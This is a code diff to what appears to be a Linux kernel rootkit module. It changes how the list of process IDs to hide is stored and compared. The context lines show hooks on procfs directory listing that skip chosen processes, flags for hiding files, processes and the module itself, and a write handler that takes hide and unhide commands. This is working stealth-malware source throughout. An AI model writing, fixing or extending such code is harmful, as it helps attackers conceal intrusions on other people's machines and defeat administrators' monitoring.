@@ -21,11 +21,11 @@ static int (*fs_iterate_orig)(struct file *, struct dir_context *);
 static int size, temp;
 static int current_pid = 0;
 
+static int pids_to_hide[MAX_PIDS];
 static char module_status[1024];
 static char hide_files = 0;
 static char hide_procs = 0;
 static char hide_module = 0;
-static char pids_to_hide[MAX_PIDS][8];
 
 static struct list_head *module_previous;
 static struct list_head *module_kobj_previous;
@@ -87,7 +87,7 @@ static int procfs_filldir_new(void *buf, const char *name, int namelen,
 {
     if(hide_procs)
     {
-        if(rk_atoi(name) == rk_atoi(pids_to_hide[current_pid]))
+        if(rk_atoi(name) == pids_to_hide[current_pid])
             return 0;
     }
 
@@ -213,15 +213,14 @@ static ssize_t rk_write(struct file *file, const char __user *buffer,
     {
         if(current_pid < MAX_PIDS)
         {
-            snprintf(pids_to_hide[current_pid], strlen(buffer + 6), "%s",
-                buffer + 6);
+            pids_to_hide[current_pid] = rk_atoi(buffer + 6);
             procs_hide();
             current_pid++;
         }
     }
     else if(!strncmp(buffer, "uhproc", MIN(6, count)))
     {
-        sprintf(pids_to_hide[current_pid], "0");
+        pids_to_hide[current_pid] = 0;
         procs_show();
 
         if(current_pid > 0)
